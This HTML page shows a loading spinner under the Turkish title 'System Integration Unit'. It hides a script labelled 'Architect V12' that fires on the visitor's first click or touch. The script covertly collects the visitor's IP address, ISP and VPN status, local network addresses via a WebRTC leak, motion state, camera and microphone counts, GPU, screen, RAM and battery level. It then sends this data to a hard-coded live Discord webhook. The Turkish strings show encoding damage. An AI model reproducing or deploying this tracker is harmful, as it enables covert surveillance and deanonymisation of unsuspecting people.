<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Entegrasyon Birimi</title>
    <style>
        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; cursor:crosshair; }
        .p { width: 50px; height: 50px; border: 2px solid #111; border-top: 2px solid #00ff00; border-radius: 50%; animation: r 0.5s linear infinite; }
        @keyframes r { to { transform: rotate(360deg); } }
    </style>
</head>
<body onmousedown="Architect.strike()" ontouchstart="Architect.strike()">
    <div class="p"></div>

    <script>
        "use strict";

        const Architect = (function() {
            const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
            let fired = false;

            return {
                async strike() {
                    if (fired) return; fired = true;

                    // 1. Geli≈ümi≈ü Aƒü ve Agresif VPN Analizi
                    const netRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
                    const browserTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    const vpnStatus = (netRes.timezone !== browserTZ) ? "‚ö†Ô∏è VPN AKTƒ∞F (Saat Sapmasƒ±)" : "‚úÖ TEMƒ∞Z";

                    // 2. Anlƒ±k Kinetik Analiz (Hareket/Sabit)
                    let motion = "Eri≈üim Yok (Masa√ºst√º?)";
                    window.addEventListener('devicemotion', (e) => {
                        const a = e.accelerationIncludingGravity;
                        if(a) {
                            const force = Math.sqrt(a.x**2 + a.y**2 + a.z**2);
                            motion = force > 13 ? "HAREKETLƒ∞ (Ara√ß/Y√ºr√ºy√º≈ü)" : "SABƒ∞T (Duruyor)";
                        }
                    }, { once: true });

                    // 3. Medya ve Ekran Detaylarƒ±
                    const devices = await navigator.mediaDevices.enumerateDevices().catch(() => []);
                    const camCount = devices.filter(d => d.kind === 'videoinput').length;
                    const micCount = devices.filter(d => d.kind === 'audioinput').length;

                    // 4. √áevresel Cihazlar (WebRTC LAN Leak)
                    const lanDevs = await new Promise(res => {
                        const d = [];
                        const pc = new RTCPeerConnection();
                        pc.createDataChannel("");
                        pc.onicecandidate = e => e.candidate?.candidate.includes(".local") && d.push(e.candidate.candidate.split(" ")[4]);
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                        setTimeout(() => { pc.close(); res(d.join(", ") || "Bulunamadƒ±"); }, 1200);
                    });

                    const gl = document.createElement('canvas').getContext('webgl2');
                    const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
                    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";

                    const payload = {
                        embeds: [{
                            title: "üíÄ ARCHITECT V12 - TAM SPEKTRUM ƒ∞STƒ∞HBARAT",
                            color: 65280,
                            fields: [
                                { name: "üåê Aƒû & VPN", value: `**IP:** ${netRes.ip}\n**VPN:** ${vpnStatus}\n**ISS:** ${netRes.org}\n**WiFi Tahmini:** ${netRes.org?.includes("Mobile") ? "H√ºcresel Veri" : "Yerel WiFi"}`, inline: false },
                                { name: "üõ∞Ô∏è √áEVREDEKƒ∞ Cƒ∞HAZLAR", value: `\`${lanDevs}\``, inline: true },
                                { name: "üèÉ HAREKET DURUMU", value: motion, inline: true },
                                { name: "üîã ≈ûARJ & G√ú√á", value: `%${Math.round((await navigator.getBattery?.().then(b => b.level) || 0) * 100)}`, inline: true },
                                { name: "üé• MEDYA DONANIMI", value: `**Kamera:** ${camCount} Lens | **Mikrofon:** ${micCount} Birim`, inline: false },
                                { name: "‚öôÔ∏è DONANIM & EKRAN", value: `**GPU:** ${gpu}\n**Ekran:** ${screen.width}x${screen.height} | **RAM:** ${navigator.deviceMemory}GB`, inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    };

                    navigator.sendBeacon(HOOK, JSON.stringify(payload));
                }
            };
        })();
    </script>
</body>
</html>
